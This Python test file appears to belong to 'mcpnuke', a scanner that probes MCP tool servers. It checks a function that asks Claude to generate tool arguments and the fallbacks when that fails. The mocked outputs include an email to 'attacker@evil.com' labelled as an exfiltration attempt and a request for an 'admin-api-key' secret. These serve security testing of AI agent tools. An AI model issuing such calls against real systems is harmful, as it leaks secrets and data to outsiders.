"""Tests for Phase 2 Tier 2 Claude-assisted argument generation."""

import json
from unittest.mock import patch


class TestGenerateClaudeArgs:
    """_generate_claude_args returns structured dict or falls back to _build_extended_args."""

    def _make_tool(self, name: str, desc: str, props: dict, required: list[str] | None = None) -> dict:
        return {
            "name": name,
            "description": desc,
            "inputSchema": {
                "type": "object",
                "properties": props,
                "required": required or [],
            }
        }

    def test_returns_dict(self):
        from mcpnuke.checks.tool_probes import _generate_claude_args
        tool = self._make_tool(
            "read_secret",
            "Reads a named secret from the vault",
            {"secret_name": {"type": "string", "description": "Name of the secret"}},
            ["secret_name"],
        )
        with patch("mcpnuke.checks.tool_probes._call_claude_for_args") as mock_claude:
            mock_claude.return_value = {"secret_name": "admin-api-key"}
            result = _generate_claude_args(tool, None)
        assert isinstance(result, dict)
        assert "secret_name" in result

    def test_falls_back_on_claude_failure(self):
        from mcpnuke.checks.tool_probes import _generate_claude_args
        tool = self._make_tool(
            "fetch_data",
            "Fetches data from an endpoint",
            {"endpoint_url": {"type": "string"}},
            ["endpoint_url"],
        )
        with patch("mcpnuke.checks.tool_probes._call_claude_for_args", side_effect=Exception("API error")):
            result = _generate_claude_args(tool, None)
        assert isinstance(result, dict)
        assert "endpoint_url" in result

    def test_falls_back_on_invalid_json(self):
        from mcpnuke.checks.tool_probes import _generate_claude_args
        tool = self._make_tool(
            "run_query",
            "Runs a DB query",
            {"query": {"type": "string"}},
            ["query"],
        )
        with patch("mcpnuke.checks.tool_probes._call_claude_for_args", return_value=None):
            result = _generate_claude_args(tool, None)
        assert isinstance(result, dict)

    def test_claude_result_merged_with_required_params(self):
        from mcpnuke.checks.tool_probes import _generate_claude_args
        tool = self._make_tool(
            "send_email",
            "Sends an email",
            {
                "to": {"type": "string"},
                "subject": {"type": "string"},
                "body": {"type": "string"},
            },
            ["to"],
        )
        with patch("mcpnuke.checks.tool_probes._call_claude_for_args") as mock_claude:
            mock_claude.return_value = {
                "to": "attacker@evil.com",
                "subject": "Exfil attempt",
                "body": "Stolen data: ...",
            }
            result = _generate_claude_args(tool, None)
        assert result["to"] == "attacker@evil.com"
        assert "subject" in result


class TestCallClaudeForArgs:
    """_call_claude_for_args wraps LLM call and parses JSON response."""

    def test_parses_valid_json_response(self):
        from mcpnuke.checks.tool_probes import _call_claude_for_args
        tool = {
            "name": "create_ticket",
            "description": "Creates a support ticket",
            "inputSchema": {"properties": {"title": {"type": "string"}}},
        }
        payload = {"title": "Test ticket"}
        with patch("mcpnuke.checks.tool_probes._call_claude") as mock_claude:
            mock_claude.return_value = json.dumps(payload)
            result = _call_claude_for_args(tool, model="claude-sonnet-5")
        assert result == payload

    def test_returns_none_on_api_error(self):
        from mcpnuke.checks.tool_probes import _call_claude_for_args
        tool = {"name": "test", "inputSchema": {}}
        with patch("mcpnuke.checks.tool_probes._call_claude", side_effect=Exception("timeout")):
            result = _call_claude_for_args(tool, model="claude-sonnet-5")
        assert result is None

    def test_returns_none_on_non_dict_response(self):
        from mcpnuke.checks.tool_probes import _call_claude_for_args
        tool = {"name": "test", "inputSchema": {}}
        with patch("mcpnuke.checks.tool_probes._call_claude", return_value='["not", "a", "dict"]'):
            result = _call_claude_for_args(tool, model="claude-sonnet-5")
        assert result is None
